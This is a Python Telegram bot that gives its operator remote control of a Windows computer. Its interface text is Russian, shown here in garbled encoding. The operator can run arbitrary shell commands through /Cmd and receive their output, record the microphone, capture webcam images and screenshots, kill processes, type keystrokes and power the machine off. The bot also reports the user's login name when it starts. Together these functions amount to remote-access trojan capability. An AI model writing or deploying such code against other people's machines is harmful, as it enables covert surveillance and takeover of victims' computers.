import telebot
import os
import re
import sys
import webbrowser as wb
import time
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import ctypes
import keyboard
import pyautogui as pg
from keyboard import write 
import wave
import pyaudio
import datetime
import requests
from bs4 import BeautifulSoup as BS
import lxml

from core.Screen	import *
from core.Tasklist  import *
from core.Taskkill  import *
from core.Webcam    import *

devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(
    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)

with open("token.txt","r") as file:
	variable = file.read()

with open("chatid.txt","r") as file:
	hole = file.read()

with open("join.jpg","rb") as file:
	picture = file.read()

bot = telebot.TeleBot(variable)

try:
	os.mkdir("C://Windows//Temp//TelegramBot//")

except:
	Directory = "C://Windows//Temp//TelegramBot//"

Directory = "C://Windows//Temp//TelegramBot//"

CurrentName = os.path.basename(sys.argv[0])

menu = telebot.types.ReplyKeyboardMarkup()
buttonstart = telebot.types.KeyboardButton('/start')
button1 = telebot.types.KeyboardButton('/Power\nüî¥')
button3 = telebot.types.KeyboardButton('/Screen\nüñº')
button4 = telebot.types.KeyboardButton('/Microphone\nüîä')
button6 = telebot.types.KeyboardButton('/Tasklist\nüìÑ')
button7 = telebot.types.KeyboardButton('/Taskkill\nüíÄ')
button14 = telebot.types.KeyboardButton('/2\n‚û°')
menu.row(button1, button4, button14)
menu.row(button3, button7, button6)

soap = telebot.types.InlineKeyboardMarkup()
button = telebot.types.InlineKeyboardButton('üîâ –£–º–µ–Ω—å—à–∏—Ç—å –∑–≤—É–∫', callback_data='down')
button1 = telebot.types.InlineKeyboardButton('üîä –£–≤–µ–ª–∏—á–∏—Ç—å –∑–≤—É–∫', callback_data='upupup')
button2 = telebot.types.InlineKeyboardButton('üîà –í–∫–ª—é—á–∏—Ç—å –º—É—Ç', callback_data='mute')
button3 = telebot.types.InlineKeyboardButton('üîâ –£–±—Ä–∞—Ç—å –º—É—Ç', callback_data='unmute')
soap.row(button)
soap.row(button1)
soap.row(button2, button3)

menu2 = telebot.types.ReplyKeyboardMarkup()
button9 = telebot.types.KeyboardButton('/URL\nüîó')
button10 = telebot.types.KeyboardButton('/Message\nüíõ')
button11 = telebot.types.KeyboardButton('/Cmd\n‚ö´')
button12 = telebot.types.KeyboardButton('/Webcam\nüì∏')
button13 = telebot.types.KeyboardButton('/Text\n‚å®')
button14 = telebot.types.KeyboardButton('/1\n‚¨Ö')
menu2.row(button14, button9, button11)
menu2.row(button13, button12, button10)

main = telebot.types.InlineKeyboardMarkup()
button1 = telebot.types.InlineKeyboardButton('‚ò† –£–±–∏—Ç—å –≤—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã', callback_data='taskkill all')
button2 = telebot.types.InlineKeyboardButton('‚¨á –°–≤–µ—Ä–Ω—É—Ç—å –≤–∫–ª–∞–¥–∫–∏', callback_data='roll your neck')
main.row(button1)
main.row(button2)

main2 = telebot.types.InlineKeyboardMarkup()
button1 = telebot.types.InlineKeyboardButton('‚≠ï –ì–∏–±–µ—Ä–Ω–∞—Ü–∏—è', callback_data='hibernate')
button2 = telebot.types.InlineKeyboardButton('üõë –í—ã–∫–ª—é—á–∏—Ç—å', callback_data='shutdown')
button3 = telebot.types.InlineKeyboardButton('üîÉ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞', callback_data='restart')
button4 = telebot.types.InlineKeyboardButton('üîí –ó–∞–≤–µ—Ä—à–∏—Ç—å —Å–µ–∞–Ω—Å', callback_data='logoff')
button5 = telebot.types.InlineKeyboardButton('‚è± –ü–æ —Ç–∞–π–º–µ—Ä—É', callback_data='time')
button6 = telebot.types.InlineKeyboardButton('üìõ –û—Ç–∫–ª—é—á–∏—Ç—å —Ç–∞–π–º–µ—Ä', callback_data='stoptimer')
button7 = telebot.types.InlineKeyboardButton('üåù –°–æ–Ω', callback_data='moon')
main2.row(button1)
main2.row(button2)
main2.row(button3)
main2.row(button4)
main2.row(button7)
main2.row(button5)
main2.row(button6)

def Microphone(File, Seconds):
	CHUNK = 1024
	FORMAT = pyaudio.paInt16
	CHANNELS = 2
	RATE = 44100
	RECORD_SECONDS = float(Seconds)
	WAVE_OUTPUT_FILENAME = File
	p = pyaudio.PyAudio()
	stream = p.open(format=FORMAT,
					channels=CHANNELS,
					rate=RATE,
					input=True,
					frames_per_buffer=CHUNK)
	frames = []
	for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
		data = stream.read(CHUNK)
		frames.append(data)
	stream.stop_stream()
	stream.close()
	p.terminate()
	wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
	wf.setnchannels(CHANNELS)
	wf.setsampwidth(p.get_sample_size(FORMAT))
	wf.setframerate(RATE)
	wf.writeframes(b''.join(frames))
	wf.close()

url = "https://www.currency.me.uk/convert/usd/rub"
r = requests.get(url)
soup = BS(r.text, 'lxml')
curs = soup.find("span", {"class" : "mini ccyrate"}).text

hour = int(datetime.datetime.now().hour)
if hour >= 0 and hour < 12:
	try:
		bot.send_photo(hole, picture,f'''

üîÜüåê –û–Ω–ª–∞–π–Ω!

üëã –ü—Ä–∏–≤–µ—Ç—Å—Ç–≤—É—é –≤–∞—Å {os.getlogin()}
üåû–î–æ–±—Ä–æ–µ –£—Ç—Ä–æ!

üí∏ –ö—É—Ä—Å —Ä—É–±–ª—è - {curs}''')

	except:
		pass

elif hour >= 12 and hour < 18:
	try:
		bot.send_photo(hole, picture,f'''

üîÜüåê –û–Ω–ª–∞–π–Ω!

üëã –ü—Ä–∏–≤–µ—Ç—Å—Ç–≤—É—é –≤–∞—Å {os.getlogin()}
‚òÄ–î–æ–±—Ä–æ–≥–æ –î–Ω—è!

üí∏ –ö—É—Ä—Å —Ä—É–±–ª—è - {curs}''')

	except:
		pass

else:
	try:
		bot.send_photo(hole, picture,f'''

üîÜüåê –û–Ω–ª–∞–π–Ω!

üëã –ü—Ä–∏–≤–µ—Ç—Å—Ç–≤—É—é –≤–∞—Å {os.getlogin()}
üåô–î–æ–±—Ä–æ–π –ù–æ—á–∏

üí∏ –ö—É—Ä—Å —Ä—É–±–ª—è - {curs}''')

	except:
		pass

@bot.message_handler(regexp='/help')
def help(command):
	bot.send_message(command.chat.id, '''
	__C–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥:__

	/Power (–ø–∞—Ä–∞–º–µ—Ç—Ä) - —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–∏—Ç–∞–Ω–∏–µ–º –∫–æ–º–ø—å—é—Ç–µ—Ä–∞

	/Microphone (–≤ —Å–µ–∫—É–Ω–¥–∞—Ö) - –∑–∞–ø–∏—Å—å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞

	/Screen - –æ—Ç–ø—Ä–∞–≤–∫–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞

	/Taskkill (–ø—Ä–æ—Ü–µ—Å—Å) - —É–±–∏–≤–∞–µ—Ç –ø—Ä–æ—Ü–µ—Å—Å

	/Tasklist - –æ—Ç–ø—Ä–∞–≤–∫–∞ –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤

	/URL (—Å—Å—ã–ª–∫–∞) - –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—É—é —Å—Å—ã–ª–∫—É

	/Cmd (–∫–æ–º–∞–Ω–¥–∞) - –Ω–∞–ø–∏—Å–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã –≤ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–µ

	/Text (—Ç–µ–∫—Å—Ç) - –Ω–∞–ø–∏—Å–∞–Ω–∏–µ —Ç–µ–∫—Å—Ç–∞

	/Webcam - –æ—Ç–ø—Ä–∞–≤–∫–∞ –≤–µ–±-–∫–∞–º–µ—Ä—ã

	/Message - –æ—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –∫–∞–∫ –æ—à–∏–±–∫—É
	''', parse_mode='MarkdownV2')

def dsendmess(call, text):
	try:
		bot.send_message(chat_id=call.message.chat.id, message_id=call.message.message_id, text=text, parse_mode='Markdown')
	except:
		pass

def sendmess(call, text):
	try:
		bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=text, parse_mode='Markdown')
	except:
		pass

@bot.callback_query_handler(func=lambda call: True)
def CallbackInline(command):
	if command.message:
		if command.data == 'hibernate':
			sendmess(command, "‚≠ï –ì–∏–±–µ—Ä–Ω–∞—Ü–∏—è...")
			os.system("shutdown -s /t 0 /f")
			sendmess(command, "–ì–æ—Ç–æ–≤–æ")
			
		elif command.data == 'shutdown':
			sendmess(command, "üõë –í—ã–∫–ª—é—á–µ–Ω–∏–µ...")
			os.system("shutdown -s /t 0 /f")
			sendmess(command, "–ì–æ—Ç–æ–≤–æ")

		elif command.data == 'restart':
			sendmess(command, "üîÉ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞...")
			os.system("shutdown -r /t 0 /f")
			sendmess(command, "–ì–æ—Ç–æ–≤–æ")

		elif command.data == 'logoff':
			sendmess(command, "üîí –í—ã—Ö–æ–¥...")
			os.system("shutdown -l /f")
			sendmess(command, "–ì–æ—Ç–æ–≤–æ")

		elif command.data == 'moon':
			sendmess(command, "–°–æ–Ω...")
			os.system("shutdown /h")
			sendmess(command, "üåù –ö–æ–º–ø—å—é—Ç–µ—Ä –ø–µ—Ä–µ–≤–µ–¥—ë–Ω –≤ —Å–ø—è—â–∏–π —Ä–µ–∂–∏–º")

		elif command.data == 'stoptimer':
			sendmess(command, "–û—Ç–∫–ª—é—á–µ–Ω–∏–µ —Ç–∞–π–º–µ—Ä–∞...")
			os.system('shutdown /a')
			sendmess(command, "‚õî –¢–∞–π–º–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")

		elif command.data == 'time':
			sendmess(command, "/timer <–≤ —Å–µ–∫—É–Ω–¥–∞—Ö>")

		elif command.data == 'taskkill all':
			subprocess.call('taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq %username%" /fi "IMAGENAME ne "' + CurrentName + '"',
				shell=True)
			subprocess.call('explorer.exe',
				shell=True)

		elif command.data == 'wind':
			pg.hotkey('win', 'd')
			bot.send_message(message.chat.id, '–ì–æ—Ç–æ–≤–æ')

		elif command.data == 'down':
			keyboard.send("volume down")
			#sendmess(command, "–ó–≤—É–∫ —É–º–µ–Ω—å—à–µ–Ω –Ω–∞ 2")

		elif command.data == 'upupup':
			keyboard.send("volume up")
			#sendmess(command, "–ó–≤—É–∫ —É–≤–µ–ª–∏—á–µ–Ω–∏ –Ω–∞ 2üîä")

		elif command.data == 'mute':
			keyboard.send("volume mute")
			#sendmess(command, "–ó–≤—É–∫ —É–±—Ä–∞–Ω")

		elif command.data == 'unmute':
			keyboard.send("volume mute")
			dsendmess(command, "–ú—É—Ç —É–±—Ä–∞–Ωüîâüîäüîà")
			#volmic()

		elif command.data == 'roll your neck':
			pg.hotkey("win", "d")

@bot.message_handler(regexp='/Microphone')
def Audio(command):
	#message1 = bot.send_message(message.chat.id, message.id)
	bot.delete_message(command.chat.id, command.id)
	try:
		Seconds = re.split('/Microphone',command.text, flags=re.I)[1]
		try:
			File = Directory + 'Audio.wav'
			Microphone(File, Seconds)
			Audio = open(File, 'rb')
			bot.send_voice(command.chat.id, Audio)
		except ValueError:
			bot.reply_to(command, '–£–∫–∞–∂–∏—Ç–µ –≤—Ä–µ–º—è –∑–∞–ø–∏—Å–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö', parse_mode='Markdown')
		except:
			bot.reply_to(command, '–ú–∏–∫—Ä–æ—Ñ–æ–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω', parse_mode='Markdown')
	except:
		bot.send_message(command.chat.id, 'üî¥ –í–≤–µ–¥–∏—Ç–µ –≤—Ä–µ–º—è –≤ —Å–µ–∫—É–Ω–¥–∞—Ö /Microphone <—Å–µ–∫—É–Ω–¥—ã>', parse_mode='Markdown')



@bot.message_handler(regexp='/Cmd')
def CMD(command):
	bot.delete_message(command.chat.id, command.id)
	try:
		Command = re.split('/CMD ', command.text, flags=re.I)[1]
		CMD = subprocess.Popen(Command,
			shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
		Lines = []
		for Line in CMD.stdout.readlines():
			Line = Line.strip()
			if Line:
				Lines.append(Line.decode('cp866'))
				Output = '\n'.join(Lines)
		bot.send_message(command.chat.id, Output)
	except:
		try:
			Command = re.split('/CMD ', command.text, flags=re.I)[1]
			SplittedText = telebot.util.split_string(Output, 4096)
			for Output in SplittedText:
				bot.send_message(command.chat.id, Output)
		except UnboundLocalError:
			bot.reply_to(command, '–ö–æ–º–∞–Ω–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞', parse_mode='Markdown')
		except:
			bot.send_message(command.chat.id, 'üî¥ –í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É /Cmd <–∫–æ–º–∞–Ω–¥–∞>', parse_mode='Markdown')

@bot.message_handler(regexp='/timer')
def timer(command):
	bot.delete_message(command.chat.id, command.id)
	timer = re.split('/timer', command.text, flags=re.I)[1]
	os.system("shutdown -s -t " + timer)
	bot.send_message(command.chat.id, '–ì–æ—Ç–æ–≤–æ')

@bot.message_handler(regexp='/Taskkill')
def Taskkill(command):
	try:

		Process = re.split('/Taskkill ', command.text, flags=re.I)[1]
		KillProcess(Process)

		if not Process.endswith('.exe'):
			Process = Process + '.exe'

		bot.reply_to(command, '–ü—Ä–æ—Ü–µ—Å—Å *' + Process + '* –∑–∞–≤–µ—Ä—à—ë–Ω', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, 
			'/Taskkill (–Ω–∞–∑–≤–∞–Ω–∏–µ)'
			'\n'
			#'\n*‚Ä∫ /Taskkill*'
			'\n'
			'\n–ê–∫—Ç–∏–≤–Ω—ã–µ –æ–∫–Ω–∞'
			'\n'
			'\n`' + WindowTitle() + '`',
				reply_markup=main, parse_mode='Markdown')

@bot.message_handler(regexp='/Text')
def sendword(command):
	bot.delete_message(command.chat.id, command.id)
	try:
		Text = re.split('/Text ', command.text, flags=re.I)[1]
		bot.send_message(command.chat.id, '‚å® –ü–µ—á–∞—Ç—å...', parse_mode='Markdown')
		write(Text)
		bot.send_message(command.chat.id, '‚úî –ì–æ—Ç–æ–≤–æ', parse_mode='Markdown')
	except:
		bot.send_message(command.chat.id, 'üî¥ –ù–∞–ø–∏—à–∏—Ç–µ —Å–ª–æ–≤–æ –∫–æ—Ç–æ—Ä–æ–µ —Ö–æ—Ç–∏—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç—å /Text <—Å–ª–æ–≤–æ –∏–ª–∏ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ>')

@bot.message_handler(regexp='/Message')
def messagewin(command):
	bot.delete_message(command.chat.id, command.id)
	try:

		Message1 = re.split('/Message ', command.text, flags=re.I)[1]
		bot.send_message(command.chat.id, 'üíå –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ', parse_mode='Markdown')
		ctypes.windll.user32.MessageBoxW(0, Message1, u'', 0x40)

	except:
		bot.send_message(command.chat.id, 'üî¥ –í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ /Message <—Å–æ–æ–±—â–µ–Ω–∏–µ>', parse_mode='Markdown')


@bot.message_handler(regexp='/Webcam')
def Webcam(command):
	bot.delete_message(command.chat.id, command.id)
	try:
		bot.send_chat_action(command.chat.id, 'upload_photo')
		File = Directory + 'Webcam.jpg'

		if os.path.exists(File):
			os.remove(File)

		WebcamScreenshot(File)
		Webcam = open(File, 'rb')
		bot.send_photo(command.chat.id, Webcam)
	except:
		bot.send_message(command, 'üî¥ –í–µ–± –∫–∞–º–µ—Ä–∞ –Ω–∞ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞', parse_mode='Markdown')

@bot.message_handler(commands=["URL"])
def OpenUrl(command):
	bot.delete_message(command.chat.id, command.id)
	try:
		URL = re.split('/URL ', command.text, flags=re.I)[1]
		if not URL.startswith('http'):
			URL = 'http://' + URL
		#subprocess.call('start ' + URL, shell=True)
		wb.open(URL)
		bot.send_message(command.chat.id, '‚úî –°–∞–π—Ç –æ—Ç–∫—Ä—ã—Ç', parse_mode='Markdown')
	except:
		bot.send_message(command.chat.id, 'üî¥ –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É --> /URL <—Å—Å—ã–ª–∫–∞>', parse_mode='Markdown')

@bot.message_handler(regexp='/Tasklist')
def Tasklist(command):
	bot.delete_message(command.chat.id, command.id)
	bot.send_message(command.chat.id, '`' + ProcessList() + '`', parse_mode='Markdown')

@bot.message_handler(commands=["start"])
def start(message):
	#bot.delete_message(command.chat.id, command.id)
	bot.send_message(message.chat.id, "hello", reply_markup=menu, parse_mode='Markdown')

@bot.message_handler(commands=["Screen"])
def Screen(command):
	bot.delete_message(command.chat.id, command.id)
	try:
		bot.send_chat_action(command.chat.id, 'upload_photo')
		File = Directory + 'Screenshot.jpg'
		Screenshot(File)
		Screen = open(File, 'rb')
		bot.send_photo(command.chat.id, Screen)

	except:
		pass

@bot.message_handler(commands=['1'])
def one(command):
	bot.delete_message(command.chat.id, command.id)
	bot.send_message(command.chat.id, '‚¨Ö 1 —Å—Ç—Ä–∞–Ω–∏—Ü–∞', reply_markup=menu, parse_mode='Markdown')

@bot.message_handler(commands=['2'])
def two(command):
	bot.delete_message(command.chat.id, command.id)
	bot.send_message(command.chat.id, '‚û° 2 —Å—Ç—Ä–∞–Ω–∏—Ü–∞', reply_markup=menu2, parse_mode='Markdown')

@bot.message_handler(commands=['menu', 'Menu'])
def manu(command):
	bot.delete_message(command.chat.id, command.id)
	bot.send_message(command.chat.id, 'üß© –ú–µ–Ω—é', reply_markup=menu, parse_mode='Markdown')

@bot.message_handler(commands=['Power'])
def Power(command):
	bot.delete_message(command.chat.id, command.id)
	bot.send_message(command.chat.id, 'üñ• –í—ã–±–µ—Ä–∏—Ç–µ –∫–∞–∫ –≤—ã–∫–ª—é—á–∏—Ç—å —Å–∏—Å—Ç–µ–º—É', reply_markup=main2, parse_mode='Markdown')

@bot.message_handler(commands=['Volume'])
def volume(command):
	bot.delete_message(command.chat.id, command.id)
	bot.send_message(command.chat.id, 'üîä –í—ã–±–µ—Ä–∏—Ç–µ –ø–∞—Ä–∞–º–µ—Ç—Ä —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∑–≤—É–∫–∞', reply_markup=soap, parse_mode='Markdown')

bot.polling(True)
